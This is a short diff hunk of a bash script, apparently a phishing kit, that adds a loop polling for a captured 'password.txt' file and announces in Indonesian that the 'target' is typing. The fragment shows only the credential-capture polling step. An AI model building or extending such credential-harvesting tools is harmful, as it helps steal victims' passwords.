@@ -37,6 +37,7 @@ fi
 
 sleep 0.5
 
+while [ true ]; do
 if [[ -e "site/$server/password.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Target menulis!\n"
 password
